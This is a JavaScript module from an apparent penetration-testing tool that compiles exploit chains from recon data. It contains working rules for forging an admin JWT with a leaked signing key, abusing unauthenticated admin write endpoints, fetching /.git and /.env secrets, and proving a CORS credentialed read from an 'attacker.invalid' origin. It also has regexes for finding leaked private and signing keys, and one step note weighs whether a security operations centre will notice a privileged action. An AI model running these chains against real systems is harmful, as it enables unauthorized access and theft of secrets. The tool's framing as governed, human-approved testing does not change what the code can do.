// VARVEL — chainforge: the deterministic exploit-chain COMPILER.
//
// Nobody has this. RedAmon's agent reasons its way to a chain at runtime (LLM
// improvisation, different every run); Cobalt gives you a toolkit and your own brain.
// chainforge takes the STRUCTURED SURFACE DATA (endpoints, tech, findings, leaked
// material) and COMPILES an executable, evidence-carrying exploit chain — the same
// declarative form chainrun executes — with per-step confidence and honest gaps.
//
// The operator brain, as data: each rule encodes a full methodology as prerequisites →
// ordered steps → honest confidence. Prerequisites are checked against the surface; a
// rule that can't complete reports exactly what it's missing instead of hallucinating.
//
// Governance: compiled chains are chainrun-shaped — same-origin enforced, budget-capped,
// evidence per step, honest stop on failure. Nothing here fires a packet; it PRODUCES
// the plan. Execution stays the governed, HITL-gated decision.

// ——— rule input extraction ———
const findEndpoint = (endpoints, re) => endpoints.find((e) => re.test(e.path || e.url || ''));
const hasFinding = (findings, re) => findings.find((f) => re.test(f.title || f.id || ''));

// Key-material patterns the compiler recognizes in evidence/text (leaked signing keys).
const KEY_PATTERNS = [
  /([a-z][\w-]{2,30}-hs256-[\w-]{4,40})/i,          // vendor-style hs256 key ids
  /(?:signing[_-]?key|jwt[_-]?key|secret)['"\s:=]+([\w./+=-]{12,80})/i,
  /-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----/,
];

function extractLeakedKey(evidence) {
  for (const re of KEY_PATTERNS) {
    const m = re.exec(String(evidence || ''));
    if (m) return { key: m[1] || m[0], kind: 'hs256-signing-key' };
  }
  return null;
}

// ——— the rules ———
// Each rule: id, title, needs(surface) → { ok, gaps[], ctx }, build(ctx) → steps[].
// ctx carries extracted parameters (paths, key hints, creds) into step construction.
export const RULES = [
  {
    id: 'jwt-forge-chain',
    title: 'Leaked signing key → forged session → admin write + revert',
    needs({ endpoints, material }) {
      const gaps = [];
      const bundlePath = material.bundlePath || (findEndpoint(endpoints, /legacy|bundle|auth\.js/i) || {}).path;
      const loginPath = material.loginPath || (findEndpoint(endpoints, /^\/login$/i) || {}).path;
      const adminPath = material.adminPath || (findEndpoint(endpoints, /^\/admin$/i) || {}).path;
      const writePath = material.writePath || (findEndpoint(endpoints, /admin\/(content|banner|message|config)/i) || {}).path;
      if (!bundlePath) gaps.push('no JS bundle / leak source path known');
      if (!loginPath) gaps.push('no login endpoint found (claim-shape step needs it)');
      if (!adminPath) gaps.push('no admin endpoint found');
      if (!writePath) gaps.push('no reversible write endpoint found');
      // Low-priv creds are a RUNTIME dependency, not a compile blocker: the target may publish
      // them (/docs, registration) or recon may have missed them. The plan documents it.
      return { ok: !gaps.length, gaps, ctx: { bundlePath, loginPath, adminPath, writePath, creds: material.lowPrivCreds, keyRegex: material.keyRegex, claims: material.claims, marker: material.marker } };
    },
    build({ bundlePath, loginPath, adminPath, writePath, creds, keyRegex, claims, marker }) {
      const steps = [
        { id: 'leak-key', path: bundlePath,
          extract: { key: { regex: keyRegex || '([\\w-]{8,64})' } },
          expect: { status: 200 }, note: 'fetch the leak source and extract the signing key' },
      ];
      if (!creds) steps.push({ id: 'obtain-creds', path: '/docs', expect: { status: 200 }, note: 'RUNTIME DEPENDENCY: find the low-priv creds the target publishes (docs/sandbox/registration). If none exist, skip the login and accept the impossible-session risk (SOCs hunt cold privileged actions)' });
      steps.push({ id: 'login', method: 'POST', path: loginPath, form: creds || {}, expect: { status: 302 }, note: creds ? 'establish a legitimate low-priv session (claim shape + login history)' : 'login with the discovered low-priv creds (fill at runtime)' });
      steps.push({ id: 'forge', jwt: { var: 'jwt', key: '{{key}}', claims: claims || { role: 'admin', iss: 'axiom-auth', iat: 1, exp: 9999999999 } }, note: 'mint the elevated token with the leaked key' });
      steps.push({ id: 'verify-admin', path: adminPath, headers: { cookie: 'axm_session={{jwt}}' }, expect: { status: 200 }, note: 'confirm the forged token grants admin' });
      steps.push({ id: 'prove-write', method: 'POST', path: writePath, headers: { cookie: 'axm_session={{jwt}}', 'content-type': 'application/json' }, body: JSON.stringify({ headline: marker || 'chainforge-verification' }), expect: { status: 200, contains: 'revert' }, extract: { original: { json: 'previous' } }, note: 'one reversible change; capture the ORIGINAL value from the response for the revert' });
      steps.push({ id: 'revert', method: 'POST', path: writePath, headers: { cookie: 'axm_session={{jwt}}', 'content-type': 'application/json' }, body: '{"headline":"{{original}}"}', expect: { status: 200 }, note: 'restore the captured original — net target change zero' });
      return steps;
    },
    confidence: 'confirmed-method (the chain that breached Axiom, compiled from surface data)',
  },
  {
    id: 'broken-write',
    title: 'Unauthenticated write endpoint → reversible-change proof',
    needs({ endpoints }) {
      const writePath = (endpoints.find((e) => /POST|PUT/.test(String(e.method || e.methods || '')) && /admin|banner|content|config|message/i.test(e.path || e.url || '')) || {}).path;
      const gaps = writePath ? [] : ['no write-capable endpoint discovered (need POST/PUT on a content/config path)'];
      return { ok: !gaps.length, gaps, ctx: { writePath } };
    },
    build({ writePath }) {
      return [
        { id: 'prove-write', method: 'POST', path: writePath, body: JSON.stringify({ probe: 'chainforge' }), expect: { status: 200 }, extract: { original: { json: 'previous' } }, note: 'confirm the write endpoint accepts unauthenticated change; capture the original value' },
        { id: 'revert', method: 'POST', path: writePath, body: '{"probe":"{{original}}"}', expect: { status: 200 }, note: 'restore the captured original' },
      ];
    },
    confidence: 'firm (endpoint observed; acceptance unverified until run)',
  },
  {
    id: 'exposed-secrets',
    title: 'Exposed secret artifacts → fetch + document (read-only)',
    needs({ findings }) {
      const git = hasFinding(findings, /git/i);
      const env = hasFinding(findings, /env file|\.env/i);
      const gaps = git || env ? [] : ['no exposed secret artifacts found (/.git, /.env, config dumps)'];
      return { ok: !gaps.length, gaps, ctx: {} };
    },
    build() {
      return [
        { id: 'fetch-git', path: '/.git/HEAD', expect: { status: 200, contains: 'ref:' }, note: 'confirm the VCS leak' },
        { id: 'fetch-git-config', path: '/.git/config', expect: { status: 200, contains: '[core]' }, note: 'repository metadata' },
        { id: 'fetch-env', path: '/.env', expect: { status: 200 }, note: 'secrets file — document contents, never weaponize beyond proof' },
      ];
    },
    confidence: 'confirmed (content-verified on fetch)',
  },
  {
    id: 'cors-theft',
    title: 'CORS reflect-with-credentials → cross-origin data-read proof',
    needs({ findings, endpoints }) {
      const cors = hasFinding(findings, /cors reflects/i);
      const dataPath = (findEndpoint(endpoints, /api\/(users|user|account|me|profile)/i) || {}).path;
      const gaps = [];
      if (!cors) gaps.push('no CORS reflect-with-credentials finding');
      if (!dataPath) gaps.push('no user-data API endpoint found');
      return { ok: !gaps.length, gaps, ctx: { dataPath } };
    },
    build({ dataPath }) {
      return [
        { id: 'verify-cors', path: dataPath, headers: { origin: 'https://attacker.invalid' }, expect: { status: 200 }, note: 'confirm the origin is reflected with credentials — the cross-origin read is possible' },
        { id: 'fetch-data', path: dataPath, expect: { status: 200 }, note: 'the data a malicious site would read (documented, not retained)' },
      ];
    },
    confidence: 'confirmed-method',
  },
];

// Compile the surface into executable chains. `material` carries recon-extracted facts:
// { bundlePath, loginPath, adminPath, writePath, lowPrivCreds: {field:value}, keyRegex,
//   claims, marker, leakedKeyEvidence } — anything already proven about the target.
export function chainforge({ endpoints = [], findings = [], material = {} } = {}) {
  const plans = [];
  const allGaps = [];
  for (const rule of RULES) {
    const n = rule.needs({ endpoints, findings, material });
    if (!n.ok) { allGaps.push({ rule: rule.id, missing: n.gaps }); continue; }
    plans.push({
      rule: rule.id, title: rule.title, confidence: rule.confidence,
      steps: rule.build(n.ctx),
      requestsEstimate: rule.build(n.ctx).filter((s) => !s.jwt).length,
    });
  }
  return {
    plans: plans.sort((a, b) => a.requestsEstimate - b.requestsEstimate),
    gaps: allGaps,
    honest: plans.length ? 'compiled from observed surface data only' : 'insufficient surface evidence — no chain compiled (honest empty, not a hallucinated plan)',
  };
}
